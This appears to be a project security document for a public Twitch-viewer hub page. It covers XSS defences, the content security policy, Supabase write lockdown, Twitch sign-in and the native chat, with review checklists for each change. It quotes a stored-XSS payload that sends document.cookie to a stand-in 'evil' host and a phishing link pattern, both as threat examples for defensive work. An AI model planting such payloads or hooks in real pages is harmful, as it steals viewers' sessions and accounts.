# Viewer hub security - the rules, and why

The hub is a PUBLIC page carrying data that VIEWERS CONTROL. Hero names are Twitch display
names. Titles, epitaphs and chat-derived text are all attacker-controlled. Treat every string in
the snapshot as hostile input, because it is.

Mr. E's instruction, Nov 12: "lock it down so we don't get hackers or people trying to script in."

## The threat that actually matters: stored XSS

Nobody is going to break Postgres. The realistic attack is a viewer enlisting under the name

    <img src=x onerror=fetch('https://evil/'+document.cookie)>

which the game stores, publishes, and the hub renders. If the page writes that into the DOM as
HTML, every viewer who opens the hub runs that attacker's code. That is "people trying to script
in", and it is the one hole worth real paranoia.

We defend it TWICE: sanitize on the way in (W1a, the game) and escape on the way out (W1b, the
page). Either alone would probably do. Both means a mistake in one is not a breach.

## Layer 1 - the game, when it publishes (W1a, desktop)

- Strip control characters from every viewer-supplied string before it goes in the payload.
- Cap lengths: a display name is at most 25 characters, an epitaph at most 120. Twitch will not
  issue longer names; anything longer is someone probing.
- Never publish anything private. No Twitch user ids, no tokens, no emails, no IP addresses, no
  file paths. The hub is world-readable by design - assume it is scraped.
- The service key lives in user://supabase.json and NEVER in the repo. It bypasses RLS.

## Layer 2 - the page, when it renders (W1b)

- NEVER innerHTML / outerHTML / insertAdjacentHTML / document.write / eval / new Function, or any
  framework raw-HTML escape hatch, for any value from the snapshot. textContent and
  createElement only. A hostile name must render as literal text.
- Content-Security-Policy meta tag, strict:
    default-src 'none'; connect-src https://paaukwaffaamazgrndbv.supabase.co; script-src 'self';
    style-src 'self'; img-src 'self' data:; base-uri 'none'; form-action 'none';
    frame-ancestors 'none'
  No inline <script>, no inline style attributes - keep JS and CSS in their own files so
  'unsafe-inline' is never needed. The CSP is what saves us if rule 1 is ever broken by accident.
- No third-party scripts, fonts, analytics or CDNs. Every external script is someone else's
  security problem becoming ours.
- Never build a link, image src or iframe from snapshot data. Do not interpret any field as a URL.
- Read-only: no forms, no POST, no write calls of any kind.
- Fail closed: on a fetch error or an unexpected payload shape, show a plain message. Never render
  partial unvalidated data.

## What is already locked (verified, not assumed - supervisor, Nov 12 01:20)

- RLS is ON for public.snapshot with exactly ONE policy: select, to anon and authenticated.
- There is deliberately NO insert/update/delete policy, so only the service_role key can write.
- Table-level INSERT/UPDATE/DELETE/TRUNCATE/REFERENCES/TRIGGER have been REVOKED from anon and
  authenticated. Supabase grants these by default; RLS was the only thing stopping writes, which
  meant one careless policy later would have opened a public write hole. Now it is refused twice.
- Default privileges in schema public no longer grant those to anon/authenticated either, so a
  future table does not quietly reopen it.
- Verified by test: a write with the publishable key is refused; a read with it succeeds; a write
  with the secret key succeeds.
- The publishable key is safe in the page and in this repo. The secret key is not, and is not here.

## The gate

The hub does not go public until its code has been read against this document - specifically
every place snapshot data reaches the DOM. "The brief said so" is not evidence. Publishing to
GitHub Pages is Mr. E's decision and happens after that review, not before.

## Later: phase 2 voting

Voting with Twitch login reopens all of this and adds CSRF, session handling and ballot stuffing.
None of it is in scope now. When it starts, this document gets a second half.

## Phase 2, H5 - the Twitch chat embed and the ONE CSP change (SUPERSEDED by H8)

> **SUPERSEDED, Nov 12 2026:** the iframe embed is REMOVED. It was broken for every viewer whose
> browser blocks third-party cookies (Brave, Safari, strict Chrome) - Twitch's page inside the
> frame could never keep its login, so the input stayed dead; Mr. E hit this live on Brave. The
> `frame-src` directive was removed with it (a net tightening: no third-party page is embedded at
> all any more). The chat is now native - see the H8 section below. The text that follows is kept
> as the record of what was reviewed.

This is the first and only place the hub touches a third party. It is opt-in and the
CSP change is the minimum the official embed needs. Review this section before any republish.

### What was added
- A "Twitch chat" section with a **Load Twitch chat** button. Nothing from Twitch loads on
  page load. The iframe is created only when a viewer clicks the button (`loadTwitchChat()`).
- The iframe is the official chat embed, exactly per dev.twitch.tv/docs/embed/chat:
    https://www.twitch.tv/embed/<channel>/chat?parent=<host>
  - `<channel>` is the hard-coded constant `TWITCH_CHANNEL = "jestsayin96"` in app.js. It is
    NEVER built from snapshot data. No hero name / title / epitaph / any payload field goes
    anywhere near the URL.
  - `<host>` is `location.hostname` (this page's own domain), url-encoded. Not snapshot data.

### The CSP change (before -> after)
BEFORE:
  default-src 'none'; connect-src <supabase>; script-src 'self'; style-src 'self';
  img-src 'self' data:; font-src 'self'; base-uri 'none'; form-action 'none'
AFTER (one directive added):
  ... ; font-src 'self'; frame-src https://www.twitch.tv https://embed.twitch.tv; base-uri 'none'; ...

- The ONLY addition is `frame-src https://www.twitch.tv https://embed.twitch.tv` - two named
  Twitch hosts, no wildcard. `www.twitch.tv` is the documented chat-embed host; `embed.twitch.tv`
  covers the embed's own redirect. `default-src 'none'` still blocks every other frame.
- Nothing else changed. script-src / style-src / connect-src / img-src are untouched, so the
  embed cannot add scripts, styles, connections or images to THIS page.

### Why this is safe
- The iframe is a separate, cross-origin browsing context. Twitch's own page runs inside it under
  Twitch's origin and Twitch's own CSP; our `frame-src` only governs WHICH origins may be framed,
  not what runs inside the frame. Our page cannot read into the iframe and the iframe cannot read
  our DOM (same-origin policy).
- Opt-in means a viewer who never clicks never contacts Twitch at all - no third-party request,
  no third-party cookie, by default.
- The page stays strictly READ-ONLY. The embed sends no snapshot data anywhere; chatting happens
  inside Twitch's own iframe, under the viewer's own Twitch session, not through this page.
- All four original invariants are intact: snapshot strings still reach the DOM only via el();
  no snapshot value is a URL/src/href/style; the rest of the CSP is unchanged; the honest states
  and version gate are unchanged.

### What the supervisor should check before republishing
1. `frame-src` lists only the two Twitch hosts, no wildcard, and no other directive loosened.
2. `TWITCH_CHANNEL` is a constant; grep confirms no snapshot field is concatenated into the src.
3. The embed is opt-in (button-triggered) and absent in overlay mode.
If any of that is not true, do not republish.

## Phase 2, H6 - Twitch device-code sign-in (FLAG: supervisor review)

Built so a viewer can spotlight THEIR OWN hero instead of scrolling. Mr. E's public client id is
now registered, so the flow is LIVE but strictly READ-ONLY. Review before any republish.

### Now live (read-only)
- `TWITCH_CLIENT_ID` is Mr. E's registered public client id (Bellmire Hub Login: PUBLIC client,
  device-code grant, no scopes), baked in as a `const` and NOT overridable at runtime - see the
  final section of this document. Clicking "Sign in with Twitch" starts the device-code grant;
  nothing contacts Twitch before the click. The old `?twitch_client=` test hook has been REMOVED
  (it was an account-phishing vector on a public page - see the final section).
- The empty-id branch in `twitchSignIn()` is kept only as a defensive fallback; it is not the
  live state.

### The flow (OAuth 2.0 device grant, when enabled)
1. POST id.twitch.tv/oauth2/device (client_id) -> device_code + user_code + verification_uri.
2. Show the viewer the user_code and the twitch.tv/activate link; they enter it on Twitch.
3. Poll id.twitch.tv/oauth2/token until an access_token comes back.
4. GET api.twitch.tv/helix/users with the token -> the viewer's own login.
5. Match that login to a hero in the snapshot and spotlight that card.

### The CSP change (the second and last one)
- connect-src gains `https://id.twitch.tv https://api.twitch.tv` (two named hosts, no wildcard),
  alongside the existing Supabase origin. Needed for steps 1, 3 and 4. Inert today (gated).
- No other directive changes. Supabase remains the only DATA origin; frame-src (H5) is separate.

### Why this stays safe and READ-ONLY
- The access token is the VIEWER'S OWN. It is held in a memory variable for the session only -
  never written to localStorage/sessionStorage, never sent to our Supabase backend, never used
  to write anything anywhere. It is used for exactly one read: the viewer's own login name.
- Scopes (updated for H8): `chat:read chat:edit` - the guild chat and nothing more. The token
  reads the user's own login and, only when the viewer presses send, carries THEIR chat line to
  Twitch. It is still never sent to our backend and still writes nothing anywhere else.
- The verification_uri is taken from Twitch's OAuth response (not the snapshot) and is set as a
  link href ONLY after it is checked to be a twitch.tv URL; otherwise it is shown as plain text.
- The snapshot path is untouched: no payload value is ever used in any Twitch URL, header or body.
  Matching a hero is a read of the already-rendered data by name.
- The page still performs NO viewer write to any backend. Writes remain a Phase-3 decision gated
  on an RLS design.

### What the supervisor should check before republishing
1. connect-src lists only Supabase + the two Twitch hosts, no wildcard; no other directive loosened.
2. TWITCH_CLIENT_ID is the baked `const` (Mr. E's registered public client), not overridable at
   runtime; grep confirms no `?twitch_client=` / localStorage / snapshot source can set it.
3. The token is never persisted (no localStorage/sessionStorage) and never sent to Supabase.
4. Scopes are exactly `chat:read chat:edit` (H8) and nothing more.
5. Nothing contacts Twitch on page load - the device-code call happens only on the button click.
If any of that is not true, do not republish. Mr. E has registered the app; the flow is live and read-only.

## The client id is fixed in the page - never overridable at runtime (supervisor, Nov 12)

`TWITCH_CLIENT_ID` is a `const` baked into app.js (the Bellmire Hub Login app: PUBLIC client,
device-code grant, no scopes). It must NEVER be settable from a URL parameter, localStorage, the
snapshot, or any other runtime source.

A `?twitch_client=` test hook existed while the id was empty and the page unpublished. It was
REMOVED before login went live, because on a public page it is an account-phishing vector:

    .../Bellmire-HD-stream/?twitch_client=<attacker app id>

A viewer following that link clicks "Sign in with Twitch" on a page that looks like ours, is shown
a device code, enters it at the real twitch.tv, and thereby authorizes the ATTACKER'S application
against their own Twitch account. Our empty TW_SCOPES caps the damage, but the viewer still ends up
with a stranger's app connected to their account, authorized through Mr. E's branding.

Do not re-add that hook. To test the flow against another id, edit the const locally and do not
commit it.

## Phase 2, H8 - the NATIVE guild chat (FLAG: supervisor review)

The iframe embed (H5) died of third-party cookie blocking, so the page now speaks Twitch chat's
own protocol - IRC over WebSocket - directly, in app.js. No frame, no cookies, every browser.

### The CSP delta (before -> after)
- REMOVED: `frame-src https://www.twitch.tv https://embed.twitch.tv` (no iframe exists any more;
  `default-src 'none'` again blocks every frame). This is a tightening.
- ADDED to connect-src: `wss://irc-ws.chat.twitch.tv` - Twitch's own chat socket, a hard-coded
  constant in app.js (TW_IRC), never built from any runtime value. Nothing else changed.

### Why this stays safe
- OPT-IN is kept: no connection of any kind is made until the viewer clicks "Open the guild chat".
- READ is anonymous (a justinfan nick): no login, no cookie, no identity. SEND uses the viewer's
  own H6 token, whose grant now carries `chat:read chat:edit` (see the H6 section); the message
  goes to Twitch as the viewer, exactly as if they typed it on twitch.tv. The page still performs
  NO write to our backend; Supabase remains read-only.
- Every incoming line is attacker-controlled viewer text. It reaches the DOM ONLY through el()
  (createElement + textContent) - plain text, no emote images, no markup, by design. No tag or
  prefix value is ever used as a URL, src, href, style or selector; name colours come from a fixed
  page palette chosen by hash, never from the wire's colour tag. data-* keys used for moderation
  (message id, login) are inert attribute text, and lookups iterate + string-compare - no selector
  is ever built from wire data.
- OUTGOING text is stripped of CR/LF and all control characters before sending, so a typed message
  can never smuggle a second IRC command (PASS/PRIVMSG injection). Messages are capped at 450
  chars and client-side rate-limited.
- Moderation is honoured: CLEARCHAT removes a banned user's lines (matched by LOGIN, not display
  name), CLEARMSG removes a deleted message, NOTICE/USERNOTICE render as plain system lines, and
  server PINGs are answered. Twitch's server-side bans/timeouts apply regardless, since this IS
  Twitch chat.
- Honest states: connecting / reading / connected-as / "lost its footing" with capped exponential
  retry. ?mock=chat exercises the render path (including the hostile name) with no connection.

### What the supervisor should check before republishing
1. CSP: frame-src is GONE; connect-src gained exactly `wss://irc-ws.chat.twitch.tv`; nothing else.
2. TW_IRC and TWITCH_CHANNEL are constants; grep confirms no wire/snapshot value reaches any URL.
3. Every chat render path goes through el(); no innerHTML anywhere new; zero <img> on the page.
4. ctrlStrip() runs on every OUTGOING send (IRC injection) and on incoming display strings.
5. The hostile-name check passes in ?mock=chat and the fake-socket protocol test.
If any of that is not true, do not republish.

## Phase 2, H9 - the hub die shows the town's rolls (FLAG: supervisor review)

The d20 is resolved IN THE GAME (T5): a viewer spends channel points or bits, the game rolls
and applies the outcome, it is Chronicled, and it rides the 60 s snapshot. The hub only
DISPLAYS the roll in its die section - it never initiates or submits one. The page stays
strictly READ-ONLY; no viewer write path to Supabase.

### No CSP change
- H9 adds NO external surface: no new connect-src, no frame-src, no script/style/img source.
  The strict CSP is byte-for-byte unchanged. The roll data arrives inside the Supabase
  snapshot the page already reads - nothing new is contacted.

### The data (new optional `rolls` array, newest first)
- Forward-compatible, exactly like the hero max_hp / xp_next bars: the die section shows an
  honest empty state ("No rolls from the town yet...") until the publisher sends the field,
  and invents no roll. The full contract is in web/NOTES.md.
- Every entry field is viewer-controlled and treated as hostile - `by` (display name), `what`
  (the proposition), `result` (the plain-language outcome), `cost`. All reach the DOM ONLY
  through el()/textContent, in the feed AND in the die's one-line announcement. Verified: a
  roller named <img src=x onerror=alert(1)> renders as literal text in both places; zero <img>
  on the page; no alert fires (?mock=roll, and the animate path re-checked with a <b> name).
- `tier` (crit|good|mixed|bad|fumble) is mapped through a fixed whitelist (TIER_ALIAS) and only
  ever SELECTS a CSS class (rt-<tier> / tier-<tier>); an unknown or absent value yields no tier.
  It is never written to the DOM as markup.
- `n` (the face) is validated to an integer 1..20 and used only to pick a fixed, page-owned
  rotation matrix (restFor) for the die and the crit/fumble styling by number. No snapshot
  value is ever used as a URL/src/href/style.
- Honesty: the outcome tier is shown ONLY when the publisher states it. The page NEVER derives
  an outcome from the number - a low roll is not relabelled "bad" by the hub (web/NOTES.md).

### What the supervisor should check before republishing
1. CSP unchanged (diff index.html head against the H8 state - no new directive or host).
2. renderRolls / rollEntry / announceTownRoll build the DOM through el()/createTextNode only;
   grep confirms no new innerHTML, and that `tier` only indexes TIER / selects a class and `n`
   only indexes restFor.
3. ?mock=roll passes the hostile-name test (text, no alert, zero <img>) on both the feed and
   the die's announcement; the honest empty state shows when no `rolls` field is present.
If any of that is not true, do not republish.

## Phase Y, H10 - the hub shows the bands below (FLAG: supervisor review + D46 field shape)

The party-band panel comes OFF the stream (D46, desktop) and the delving parties go INTO the
60 s snapshot as a new `parties` array. The hub's new "Bands below" section DISPLAYS every active
party - band name, floor, and each member with an HP bar and status. Read-only; the page never
writes. Built AHEAD of D46: until the publisher sends `parties`, the section shows an honest empty
state ("No bands are delving right now...") and invents no band.

### No CSP change
- H10 adds NO external surface: no new connect-src, no script/style/img source. The CSP is
  byte-for-byte unchanged. The parties data rides the Supabase snapshot the page already reads -
  nothing new is contacted, no new fetch, no viewer write path.

### Payload version gate - CHANGED, please review
- D46 bumps the payload version when it adds `parties` (WORK_PLAN D46(b): "if you add a field,
  bump the version the hub checks"). The gate now accepts a SET of known versions -
  `KNOWN_V = {"1","2"}` - instead of only "1":  "1" = today's shape (no parties), "2" = adds
  `parties`. `parties` is read defensively regardless of version (absent -> empty state), so
  pre-accepting "2" shows nothing until D46 actually ships it, and today's "1" payload is
  unaffected. Any version OUTSIDE the set still yields the honest "this page needs an update"
  (verified with a v9 payload). ACTION FOR D46: publish the parties payload as v = "2". If a
  different number is chosen, change KNOWN_V to match BEFORE D46 ships, or the hub rejects the
  payload wholesale.

### The data contract (new optional `parties` array) - PINNED FOR D46
Each entry is an object; every field optional and defended. Canonical key, then accepted aliases:
    name    the band's display name           (band, party, title)   - viewer text
    floor   integer dungeon floor it is on     (depth)
    members array of per-member objects:
      name    the hero's name                 (who, hero)            - viewer text
      hp      current hit points              (health)
      max_hp  max hit points                  (hp_max, maxhp, hpmax)
      status  ok | fallen | burning | <other>  (state, condition)
      class   the calling, optional           (calling)              - viewer text
Also in web/NOTES.md. D46 must write THIS shape so the two sides match.

### Why this stays safe
- Every string - band name, member name, an unknown status word, the class - reaches the DOM ONLY
  through el()/createTextNode (textContent). Verified live: a band named AND a member named
  <img src=x onerror=alert(1)> render as literal text; zero <img> on the page; no alert fires
  (?mock=bands AND a stubbed v2 payload with the hostile name in both places).
- HP bar widths are PAGE-COMPUTED numbers set as a CSSOM custom property (--hp), never snapshot
  text - the same safe pattern as the hero HP/XP and town-growth bars. A fallen member reads empty
  (ratio 0); a member with hp but no max_hp reads a flat vitality bar; a member with no hp shows no
  bar at all. Nothing is invented.
- `status` is mapped through a fixed whitelist (PARTY_STATUS) to ok|fallen|burning, which only ever
  SELECTS a CSS class (st-<status>) and a whitelisted ICON_SET glyph (death for fallen, the new
  page-owned `flame` for burning). An unknown status is shown as its own text (titleCased,
  length-capped), no icon - honest, never markup. No field is EVER used as a URL/src/href/style.
- New icon: `ic-flame` is a page-authored <symbol> (a hand-drawn line glyph, CC0, no request),
  added to the ICON_SET whitelist. The fallen reuse the existing `death` skull.
- Caps: at most 24 parties, 12 members each. The overlay (on-stream) column HIDES #bands - the
  whole point of D46 is that the band left the stream.

### What the supervisor should check before republishing
1. CSP unchanged (diff index.html head - no new directive or host; H10 needed none).
2. renderBands / partyCard / memberRow / memberHpBar / normalizeParties build the DOM through
   el()/createTextNode only; grep confirms no new innerHTML/outerHTML/insertAdjacentHTML; `status`
   only indexes PARTY_STATUS/STATUS_META and selects a class + whitelisted icon.
3. The version-gate change (KNOWN_V {"1","2"}) is intended and matches D46's chosen version.
4. ?mock=bands passes the hostile-name test (text, no alert, zero <img>) and the honest empty state
   shows when no `parties` field is present.
If any of that is not true, do not republish.
